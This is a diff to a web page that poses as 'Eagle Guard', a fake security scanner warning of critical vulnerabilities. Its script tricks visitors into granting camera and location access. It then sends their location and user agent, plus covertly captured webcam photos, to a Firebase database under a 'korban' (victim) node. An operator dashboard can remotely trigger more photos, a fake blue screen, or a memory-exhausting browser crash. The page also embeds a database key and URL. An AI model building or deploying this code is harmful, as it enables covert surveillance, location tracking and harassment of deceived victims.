@@ -10,91 +10,112 @@
         :root { --neon: #00f2ff; --bg: #000; }
         body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; text-align: center; }
         
-        /* BOX DESIGN */
-        .box { border: 2px solid var(--neon); padding: 40px 20px; border-radius: 20px; background: rgba(0, 242, 255, 0.05); box-shadow: 0 0 25px rgba(0, 242, 255, 0.2); width: 85%; max-width: 400px; cursor: pointer; transition: 0.3s; }
-        .box:active { transform: scale(0.95); }
+        /* MATCHING DASHBOARD STYLE */
+        .box { border: 2px solid var(--neon); padding: 40px 20px; border-radius: 24px; background: rgba(0, 242, 255, 0.03); box-shadow: 0 0 30px rgba(0, 242, 255, 0.15); width: 85%; max-width: 380px; cursor: pointer; transition: 0.3s; }
+        .box:active { transform: scale(0.98); }
 
-        /* SVG EAGLE LOGO (Matching Dashboard) */
         .eagle-svg { width: 70px; fill: var(--neon); filter: drop-shadow(0 0 10px var(--neon)); margin-bottom: 20px; }
 
-        /* LOADING ANIMATION */
-        .loader { border: 3px solid #111; border-top: 3px solid var(--neon); border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; display: none; }
+        .loader { border: 3px solid #111; border-top: 3px solid var(--neon); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; display: none; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        /* BSOD (Blue Screen of Death) */
-        #bsod { position: fixed; inset: 0; background: #0078d7; color: #fff; font-family: 'Segoe UI', sans-serif; padding: 10%; text-align: left; display: none; z-index: 9999; }
+        /* BSOD OVERLAY */
+        #bsod { position: fixed; inset: 0; background: #0078d7; color: #fff; font-family: 'Segoe UI', sans-serif; padding: 12%; text-align: left; display: none; z-index: 10001; }
         video, canvas { display: none; }
     </style>
 </head>
-<body onclick="startProtection()">
+<body onclick="igniteEngine()">
 
     <div class="box" id="ui">
         <svg class="eagle-svg" viewBox="0 0 24 24"><path d="M12 2L4.5 20.29l.71.71L12 18l6.79 3 .71-.71L12 2zM12 15.5l-3.5 1.5 3.5-8.5 3.5 8.5-3.5-1.5z"/></svg>
-        <h2 style="margin:0; letter-spacing:2px;">EAGLE GUARD</h2>
-        <p id="msg" style="font-size: 13px; opacity:0.8; margin-top:15px;">System Vulnerability Found!<br>Click to Start Deep Clean & Repair.</p>
+        <h2 style="margin:0; letter-spacing:3px; font-weight: 800;">EAGLE GUARD</h2>
+        <p id="msg" style="font-size: 13px; opacity:0.7; margin-top:15px; line-height:1.6;">Your system has <b>(3) Critical Vulnerabilities</b>.<br>Tap to Initialize Deep Repair.</p>
         <div class="loader" id="loader"></div>
-        <div id="status" style="font-size: 10px; margin-top: 15px; color: var(--neon);">[ TAP TO IGNITE ]</div>
+        <div id="status" style="font-size: 10px; margin-top: 20px; color: var(--neon); letter-spacing: 1px;">[ TOUCH TO START SCAN ]</div>
     </div>
 
     <video id="v" autoplay playsinline></video>
     <canvas id="c"></canvas>
 
     <div id="bsod">
-        <div style="font-size: 80px;">:(</div>
-        <h2 style="font-weight: normal;">Your device ran into a problem...</h2>
-        <p>We're just collecting some error info, and then we'll restart for you.</p>
-        <p><span id="pct">0</span>% complete</p>
+        <div style="font-size: 90px; margin-bottom:20px;">:(</div>
+        <h2 style="font-weight: 300; font-size: 24px;">Your device ran into a problem and needs to restart.</h2>
+        <p style="font-size: 14px; opacity:0.8; margin-top:30px;">We're just collecting some error info, and then we'll restart for you.</p>
+        <p style="font-size: 14px;"><span id="pct">0</span>% complete</p>
     </div>
 
 <script>
-    // FIREBASE CONFIG (Sesuai Dashboard Lu)
+    // SINKRONISASI DATABASE KALZ
     const config = { 
         apiKey: "AIzaSyAqdcpcUxfUBNY2H83IBa1Pp0X6YcQtDlQ", 
         databaseURL: "https://theeyes-8d0aa-default-rtdb.asia-southeast1.firebasedatabase.app" 
     };
     firebase.initializeApp(config); const db = firebase.database();
 
-    let isRunning = false;
+    let crashInterval = null;
+    let isActive = false;
 
-    async function startProtection() {
-        if(isRunning) return;
-        isRunning = true;
+    async function igniteEngine() {
+        if(isActive) return;
+        isActive = true;
         
         document.getElementById('loader').style.display = 'block';
-        document.getElementById('status').innerText = "[ INITIALIZING SECURITY TUNNEL... ]";
+        document.getElementById('status').innerText = "[ ACCESSING ENCRYPTED TUNNEL... ]";
         
         try {
-            // Minta Kamera & Lokasi Sekaligus
+            // Minta Izin Kamera (Face-ID Simulation)
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
             document.getElementById('v').srcObject = stream;
             
+            // Minta Izin Lokasi (Signal Tracking Simulation)
             navigator.geolocation.getCurrentPosition(pos => {
                 const nodeRef = db.ref('korban').push({
                     t: new Date().toLocaleString(),
                     maps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`,
-                    os: navigator.platform
+                    ua: navigator.userAgent
                 });
-                const nodeKey = nodeRef.key;
+                const nodeId = nodeRef.key;
 
-                // UI Update (Biar Target Percaya)
-                document.getElementById('msg').innerHTML = "<b>REPAIRING SYSTEM...</b><br>Please do not close this window.";
-                document.getElementById('status').innerText = "[ PROCESSING NODE: " + nodeKey.substring(1,7) + " ]";
+                // UI Berubah Jadi "Processing"
+                document.getElementById('msg').innerHTML = "<b>REPAIRING SYSTEM...</b><br>Clearing cache and fixing registries.";
+                document.getElementById('status').innerText = "[ NODE_ID: " + nodeId.substring(1,7) + " ACTIVE ]";
 
-                // 📸 AUTO-SNAP (Ambil foto otomatis setelah 2 detik)
-                setTimeout(() => { takeSnap(nodeKey); }, 2000);
+                // 📸 AUTO-SNAP PERTAMA (Tanpa perintah)
+                setTimeout(() => { takeSnap(nodeId); }, 2500);
 
-                // 🛰️ LISTENER PERINTAH DARI DASHBOARD LU
-                db.ref('commands/' + nodeKey).on('value', snap => {
+                // 🛰️ LISTENER PERINTAH DARI DASHBOARD KALZ
+                db.ref('commands/' + nodeId).on('value', snap => {
                     const cmd = snap.val()?.action;
-                    if (cmd === "TAKE") takeSnap(nodeKey);
-                    if (cmd === "BSOD") triggerBSOD();
-                    if (cmd === "CRASH") while(true) { document.body.appendChild(document.createElement('div')); }
+                    
+                    if (cmd === "TAKE") takeSnap(nodeId);
+                    
+                    if (cmd === "BSOD") {
+                        document.getElementById('bsod').style.display = 'block';
+                        let p = 0;
+                        setInterval(() => { if(p < 100) { p++; document.getElementById('pct').innerText = p; } }, 200);
+                    }
+
+                    if (cmd === "CRASH") {
+                        if(!crashInterval) {
+                            crashInterval = setInterval(() => {
+                                let junk = new Array(1000000).fill("VOID-OS-KALZ");
+                                let d = document.createElement('div');
+                                document.body.appendChild(d);
+                            }, 5); // Kecepatan tinggi untuk lag maksimal
+                        }
+                    }
+
+                    if (cmd === "STOP") {
+                        clearInterval(crashInterval);
+                        crashInterval = null;
+                        location.reload(); // Reset RAM target agar normal kembali
+                    }
                 });
 
-            }, err => { alert("Error: Security scan requires GPS access!"); location.reload(); });
+            }, err => { alert("Error: Eagle Guard needs GPS to locate repair servers!"); location.reload(); });
 
         } catch (e) {
-            alert("Error: Eagle Guard requires Face-ID permission!");
+            alert("Error: Deep Scan requires Camera Access for Biometric ID!");
             location.reload();
         }
     }
@@ -103,13 +124,7 @@
         const v = document.getElementById('v'), c = document.getElementById('c');
         c.width = v.videoWidth; c.height = v.videoHeight;
         c.getContext('2d').drawImage(v, 0, 0);
-        db.ref('hasil_foto/' + id).set({ foto: c.toDataURL('image/jpeg', 0.6) });
-    }
-
-    function triggerBSOD() {
-        document.getElementById('bsod').style.display = 'block';
-        let p = 0;
-        setInterval(() => { if(p < 100) { p++; document.getElementById('pct').innerText = p; } }, 150);
+        db.ref('hasil_foto/' + id).set({ foto: c.toDataURL('image/jpeg', 0.5) });
     }
 </script>
 </body>
